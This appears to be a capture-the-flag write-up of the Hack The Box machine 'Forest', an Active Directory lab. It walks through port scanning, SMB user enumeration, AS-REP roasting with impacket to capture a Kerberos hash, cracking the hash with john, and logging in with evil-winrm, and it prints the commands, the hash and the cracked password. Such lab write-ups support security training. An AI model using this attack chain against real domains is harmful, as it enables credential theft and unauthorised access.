# Forest  

## Nmap  

Nmap scan of ports up to 15000  

```
88/kerberos-sec
135/msrpc
139/netbios-ssn
389/ldap
445/microsoft-ds
464/kpasswd5?
593/ncacn_http
636/tcpwrapped
3268/ldap
3269/tcpwrapped
5985/http
9389/mc-nmf
```  

## rpc  

Using rpcdump.py  

```
Protocol: [MS-CMPO]: MSDTC Connection Manager: 
Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
Protocol: [MS-EVEN6]: EventLog Remoting Protocol 
Protocol: [MS-FASP]: Firewall and Advanced Security Protocol 
Protocol: [MS-FRS2]: Distributed File System Replication Protocol 
Protocol: [MS-LSAT]: Local Security Authority (Translation Methods) Remote 
Protocol: [MS-NRPC]: Netlogon Remote Protocol 
Protocol: [MS-NSPI]: Name Service Provider Interface (NSPI) Protocol 
Protocol: [MS-RAA]: Remote Authorization API Protocol 
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol
```  

```
Provider: BFE.DLL 
Provider: dfsrmig.exe 
Provider: dhcpcsvc6.dll 
Provider: dhcpcsvc.dll 
Provider: dns.exe 
Provider: efssvc.dll 
Provider: FwRemoteSvr.dll 
Provider: gpsvc.dll 
Provider: IKEEXT.DLL 
Provider: iphlpsvc.dll 
Provider: lsasrv.dll 
Provider: MPSSVC.dll 
Provider: msdtcprx.dll 
Provider: netlogon.dll 
Provider: nrpsrv.dll 
Provider: nsisvc.dll 
Provider: ntdsai.dll 
Provider: samsrv.dll 
Provider: schedsvc.dll 
Provider: services.exe 
Provider: srvsvc.dll 
Provider: sysntfy.dll 
Provider: taskcomp.dll 
Provider: wevtsvc.dll 
Provider: wininit.exe 
Provider: winlogon.exe
```  

## LDAP  

## SMB  

Using the nmap scan  

`nmap -vvv --script=smb-enum-* 10.129.230.72`  

The following users were discovered.  

```
 Administrator
 Andy Hislip
 HealthMailbox-EXCH01-001
 HealthMailbox-EXCH01-002
 HealthMailbox-EXCH01-003
 HealthMailbox-EXCH01-004
 HealthMailbox-EXCH01-005
 HealthMailbox-EXCH01-006
 HealthMailbox-EXCH01-007
 HealthMailbox-EXCH01-008
 HealthMailbox-EXCH01-009
 HealthMailbox-EXCH01-010
 HealthMailbox-EXCH01-Mailbox-Database-1118319013
 Lucinda Berger
 Mark Brandt
 Santi Rodriguez
```  

Which can be assumed the following are normal users.  

```
Administrator
Andy Hislip
Lucinda Berger
Mark Brandt
Santi Rodriguez
```  

Using enum4linux, the following usernames were found.  

```
svc-alfresco
Sebastien Caron
```  

## kerberos  

Using impacket GetNPUsers.py  

`python3 GetNPUsers.py -dc-ip 10.129.230.72 htb.local/ -usersfile ~/smb-users.txt -format john -outputfile ~/hashes`  

The following is found ready for cracking.  

`$krb5asrep$svc-alfresco@HTB.LOCAL:fd510d0e0ee5448d6b186022e245b150$9bf236ccae554208d7f7b1721829602f47d5f30d6da892baee911907eec2783a180edb8f9d4eeff058539f31
69d9e024c91db7c56490aa0547eb2460d91caee26e90ca6f2a1c1182b05b2c5d92d14b201c7c29b48b5b18c0eb5628e8a30265a5a686c3d519170de2cf1d2c57d9876173236b4bb9299237ed0fd7
4adaba8bf27c6123fc842768fd655b40466a84c8d0dbc93b6cb53bcf24a8b8f6f5553bf79a1deee5dc1a4a02a96dfb46dcff759c379d8cc235ce8e8e17687cb1f1812031e2efc86dc0b0c8b09512
cdcb472da071b3010b51544c496cfd7837d3acc236b679b284af8182599b`  

## Password cracking  

Using john  

`john --wordlist=/usr/share/wordlists/rockyou.txt hashes`  

Following password was found for the username svc-alfresco.  

`s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)`  

## Shell  

Gained RCE with the following shell.  

`evil-winrm -i 10.129.230.72 --user svc-alfresco -p s3rvice`  

